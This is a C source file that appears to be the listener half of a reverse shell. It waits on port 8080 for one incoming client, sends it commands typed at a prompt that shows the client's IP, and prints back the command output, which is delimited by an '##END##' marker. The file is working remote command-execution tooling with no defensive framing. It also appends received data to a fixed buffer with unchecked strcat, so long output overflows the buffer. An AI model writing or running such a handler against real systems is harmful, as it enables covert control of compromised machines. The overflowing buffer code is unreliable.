#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUFFER_SIZE 4096     // Buffer size for data transmission
#define END_MARKER "##END##" // Marker to indicate the end of response
#define PORT 8080            // Port number for the server

// Error handling function
void error(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

int main() {
  int server_fd, client_sock;
  struct sockaddr_in server_addr, client_addr;
  socklen_t client_len = sizeof(client_addr);
  char buffer[BUFFER_SIZE]; // Buffer to store received data

  // Create socket for the server
  if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    error("ERROR opening socket");

  // Configure server address structure
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET; // Use IPv4
  server_addr.sin_addr.s_addr =
      INADDR_ANY;                     // Accept connections from any IP address
  server_addr.sin_port = htons(PORT); // Set the port number

  // Bind the socket to the address
  if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    error("ERROR on binding");

  // Start listening for incoming connections (backlog set to 1)
  if (listen(server_fd, 1) < 0)
    error("ERROR on listen");

  printf("[+] Server started on port %d\n", PORT);

  // Accept a client connection
  if ((client_sock =
           accept(server_fd, (struct sockaddr *)&client_addr, &client_len)) < 0)
    error("ERROR on accept");

  // Convert client IP address to string format and display
  char client_ip[INET_ADDRSTRLEN];
  inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
  printf("[+] Client connected: %s\n", client_ip);
  printf("[!] exit\n");

  // Main server loop for handling commands
  while (1) {
    printf("%s $ ", client_ip); // Display the client IP address as prompt
    fflush(stdout);

    char
        command[BUFFER_SIZE]; // Buffer to store the command entered by the user
    if (!fgets(command, BUFFER_SIZE, stdin)) {
      printf("\n[!] Input error\n");
      break;
    }

    command[strcspn(command, "\n")] =
        '\0'; // Remove trailing newline from command

    // If the command is 'exit', send it to the client and break the loop
    if (strcmp(command, "exit") == 0) {
      send(client_sock, command, strlen(command), 0);
      break;
    }

    // Send the command to the client
    if (send(client_sock, command, strlen(command), 0) < 0) {
      perror("send failed");
      break;
    }

    // Receive and display the output from the client
    printf("[Output]\n");
    char response[BUFFER_SIZE * 10] = {
        0}; // Larger buffer to store the response
    size_t total_received = 0;

    // Loop to receive the response from the client
    while (1) {
      memset(buffer, 0, BUFFER_SIZE); // Clear the buffer before receiving data
      ssize_t bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);

      if (bytes_received < 0) {
        perror("recv failed");
        break;
      }
      if (bytes_received == 0) {
        printf("[!] Client disconnected\n");
        goto cleanup; // Exit if the client disconnected
      }

      buffer[bytes_received] = '\0'; // Null-terminate the received data
      strcat(response, buffer);      // Append the received data to the response
      total_received += bytes_received;

      // Check if END_MARKER is found in the response (indicates end of data)
      if (strstr(buffer, END_MARKER)) {
        char *end = strstr(response, END_MARKER);
        if (end)
          *end = '\0'; // Remove END_MARKER from the response
        break;         // Exit loop if END_MARKER is found
      }
    }

    // Print the complete response received from the client
    printf("%s\n", response);
  }

cleanup:
  // Clean up resources
  close(client_sock); // Close the client socket
  close(server_fd);   // Close the server socket
  printf("[+] Server stopped\n");
  return EXIT_SUCCESS;
}
